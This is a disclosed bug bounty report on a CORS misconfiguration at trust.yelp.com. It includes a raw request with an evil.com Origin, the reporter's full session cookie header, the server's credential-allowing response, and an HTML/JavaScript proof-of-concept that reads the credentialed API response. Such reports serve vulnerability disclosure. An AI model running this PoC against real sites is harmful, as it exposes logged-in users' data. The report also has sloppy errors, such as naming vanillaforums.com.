# CORS Misconfiguration on trust.yelp.com

## Report Details
- **Report ID**: 1716286
- **URL**: https://hackerone.com/reports/1716286
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-09-29T06:07:37.366Z
- **Disclosed**: 2022-10-10T04:59:36.429Z

## Reporter
- **Username**: ajayjachak
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: yelp

## Vulnerability Information
**Summary:**
An cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page
**Description:**
CORS misconfiguration is found on vanillaforums.com as `Access-Control-Allow-Credentials: true`.
## Steps to reproduce:

1.visit  [trust.yelp.com).
2. Request:
```
GET /wp-json HTTP/2
Host: trust.yelp.com
Origin: evil.com
Cookie: bse=2f10a62687154546b7369d41e3d21476; hl=en_US; wdi=1|5632650E427D021A|0x1.8cd49f9830b35p+30|571cd22f480ebb1f; recentlocations=; location=%7B%22city%22%3A+%22San+Francisco%22%2C+%22state%22%3A+%22CA%22%2C+%22country%22%3A+%22US%22%2C+%22latitude%22%3A+37.775123257209394%2C+%22longitude%22%3A+-122.41931994395134%2C+%22max_latitude%22%3A+37.81602226140252%2C+%22min_latitude%22%3A+37.706368356809776%2C+%22max_longitude%22%3A+-122.3550796508789%2C+%22min_longitude%22%3A+-122.51781463623047%2C+%22zip%22%3A+%22%22%2C+%22address1%22%3A+%22%22%2C+%22address2%22%3A+%22%22%2C+%22address3%22%3A+%22%22%2C+%22neighborhood%22%3A+%22%22%2C+%22borough%22%3A+%22%22%2C+%22provenance%22%3A+%22YELP_GEOCODING_ENGINE%22%2C+%22display%22%3A+%22San+Francisco%2C+CA%22%2C+%22unformatted%22%3A+%22San+Francisco%2C+CA%22%2C+%22isGoogleHood%22%3A+false%2C+%22usingDefaultZip%22%3A+false%2C+%22accuracy%22%3A+4%2C+%22language%22%3A+null%7D; xcj=1|VP4RtS_ulWCVhRYxwTqio5C_0Tnowry8JyX5dSRa8v8; _gcl_au=1.1.1120534857.1664428004; OptanonConsent=isGpcEnabled=0&datestamp=Thu+Sep+29+2022+11%3A07%3A00+GMT%2B0530+(India+Standard+Time)&version=6.34.0&isIABGlobal=false&hosts=&consentId=9f87b92f-a2b6-4222-98d3-a19bac35a2cd&interactionCount=1&landingPath=NotLandingPage&groups=BG51%3A1%2CC0003%3A1%2CC0002%3A1%2CC0001%3A1%2CC0004%3A1&AwaitingReconsent=false; _ga=GA1.2.5632650E427D021A; _gid=GA1.2.132283565.1664428009; __qca=P0-728600750-1664428009529; _clck=iywwke|1|f5a|0; _fbp=fb.1.1664428010403.1414791415; _clsk=12tz9lj|1664429606753|27|0|b.clarity.ms/collect; _conv_v=vi%3A1*sc%3A1*cs%3A1664429119*fs%3A1664429119*pv%3A3*exp%3A%7B%7D; _conv_s=si%3A1*sh%3A1664429118928-0.08454978389164447*pv%3A3; _conv_r=s%3Afooter*m%3Awww*t%3A*c%3Aclaim_business; _ga_MEZL1ZKM71=GS1.1.1664429120.1.1.1664429611.0.0.0; _hjSessionUser_2195429=eyJpZCI6ImM1NzNjMTIyLTRkOTgtNTUxYS1hOThkLTBjNjIxNjAxYWYxYyIsImNyZWF0ZWQiOjE2NjQ0MjkxMjIwNDEsImV4aXN0aW5nIjp0cnVlfQ==; _hjFirstSeen=1; _hjSession_2195429=eyJpZCI6IjBiMTJmZDIzLThkNmUtNGYxOC05Zjc5LTMwMDAyZTJlZDZlYyIsImNyZWF0ZWQiOjE2NjQ0MjkxMjI4MDgsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=0; _scid=794b8ac1-c50b-4ada-bf6e-789d2ac7e3d7; IR_gbd=yelp.com; IR_12770=1664429123516%7C0%7C1664429123516%7C%7C; _sctr=1|1664389800000; _ga_WKQNZR06KL=GS1.1.1664429203.1.1.1664429315.0.0.0; adc=oaUVdjlOR75Z-DQ7AggWhQ%3AVkHT1GfomqCobWvtlXEnhw%3A1664429336; _uetsid=832eb1003fb411edb47bd943b4efcd81; _uetvid=832eeaa03fb411ed8aa97b291a244fc8; tatari-session-cookie=fbd258df-f9a0-cad5-af44-123200dc664c
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers


```
you get an response like:
```
HTTP/2 200 OK
Content-Type: application/json; charset=UTF-8
Server: nginx
Date: Thu, 29 Sep 2022 05:52:42 GMT
Vary: Accept-Encoding
Vary: Accept-Encoding
Vary: Accept-Encoding
X-Robots-Tag: noindex
Link: <https://trust.yelp.com/wp-json/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Allow: GET
Access-Control-Allow-Origin: http://evil.com
Access-Control-Allow-Methods: OPTIONS, GET, POST, PUT, PATCH, DELETE
Access-Control-Allow-Credentials: true
X-Powered-By: WP Engine
X-Cacheable: SHORT
Vary: Accept-Encoding,Cookie
Cache-Control: max-age=600, must-revalidate
X-Cache-Group: normal
X-Cache: Miss from cloudfront
Via: 1.1 ff28c096d027c983cb30a1fcf83ea578.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: BOM78-P5
X-Amz-Cf-Id: Nna2KfbKokL-uzbVcsnV2EUkuMYAsxuclmNzDdN7ivPub5jcNMaa2A==

and some jSON code to follow...
...
```
Note:  by adding the [Like](https://trust.yelp.com/wp-json/) repose from the page in the following code developed it can be exploded 
```
<!DOCTYPE html>
<html>
    <head>
        <script>
            function cors() {
                var xhttp=new XMLHttpRequest();
                    xhttp.onreadystatechange= function() {
                        if (this.readyState == 4 && this.status ==200){
                            document.getElementById("emo").innerHTML=alert(this.responseText
                                );

                        }
                };
                xhttp.open('GET',"https://trust.yelp.com/wp-json/",true);
                xhttp.withCredentials=true;
                xhttp.send();
            }
        </script>
    </head>
    <body>
        <center>
        <h2>[!]CORS PoC Exploit!!!</h2>
        <div id="demo">
            <button type="button" onclick="cors()">Exploit</button> 
        </div>
        </center>
    </body>

</html>
```
 
## Anything else we should know?

I have the PoC attached which is the output for the above

## Impact

1. Attacker would treat many victims to visit the attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.
2. Also If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information.

## Attachments
- yelp_poc_1.png
